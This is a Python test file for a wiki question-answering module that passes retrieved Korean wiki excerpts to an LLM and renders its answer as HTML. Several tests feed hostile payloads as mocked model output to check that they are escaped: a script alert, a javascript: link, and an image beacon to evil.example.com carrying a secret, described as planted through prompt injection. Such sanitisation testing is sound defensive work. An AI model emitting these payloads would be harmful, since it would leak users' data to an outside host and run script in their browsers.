from wiki import answer as A


def test_build_prompt_includes_excerpts():
    hits = [{"id": "a", "title": "가격", "layer": "ontology", "search_text": "gbp 50만"},
            {"id": "b", "title": "광고", "layer": "ontology", "search_text": "메타 광고"}]
    msgs = A.build_messages("가격 정리해줘", hits)
    body = msgs["user"]
    assert "가격" in body and "광고" in body and "[1]" in body and "[2]" in body


def test_answer_maps_sources(monkeypatch):
    hits = [{"id": "a", "title": "가격", "layer": "ontology", "search_text": "gbp 50만"}]
    monkeypatch.setattr(A, "_call_llm", lambda system, user: "정리: [1] 참고")
    out = A.answer("가격?", hits)
    assert "정리" in out["answer_html"]
    assert out["sources"][0]["id"] == "a"


def test_answer_no_hits_skips_llm(monkeypatch):
    def _boom(system, user):
        raise AssertionError("LLM은 hits가 없으면 호출되면 안 됨")
    monkeypatch.setattr(A, "_call_llm", _boom)
    out = A.answer("아무거나", [])
    assert out["sources"] == []
    assert "찾지 못했" in out["answer_html"]


def test_answer_neutralizes_script(monkeypatch):
    hits = [{"id": "a", "title": "가격", "layer": "ontology", "search_text": "x"}]
    monkeypatch.setattr(A, "_call_llm", lambda system, user: "위험 <script>alert(1)</script>")
    out = A.answer("가격?", hits)
    assert "<script" not in out["answer_html"]
    assert "&lt;script" in out["answer_html"]


def test_answer_neutralizes_img_beacon(monkeypatch):
    """프롬프트 인젝션으로 외부 이미지 비콘을 심어도 살아 있는 <img src>가 없어야 함."""
    payload = '<img src="https://evil.example.com/x?q=secret" onerror="fetch(1)">'
    hits = [{"id": "a", "title": "가격", "layer": "ontology", "search_text": "x"}]
    monkeypatch.setattr(A, "_call_llm", lambda system, user: payload)
    out = A.answer("가격?", hits)
    # 살아있는 <img 태그가 없어야 함 (이스케이프되어 &lt;img 텍스트로만 존재)
    assert "<img" not in out["answer_html"]
    assert "&lt;img" in out["answer_html"]
    assert "evil.example.com" in out["answer_html"]   # 무해한 평문으로만 남음


def test_answer_neutralizes_javascript_link(monkeypatch):
    """마크다운 링크의 javascript: 스킴은 무력화되어야 함."""
    hits = [{"id": "a", "title": "가격", "layer": "ontology", "search_text": "x"}]
    monkeypatch.setattr(A, "_call_llm", lambda system, user: "[클릭](javascript:alert(1))")
    out = A.answer("가격?", hits)
    assert "javascript:" not in out["answer_html"]
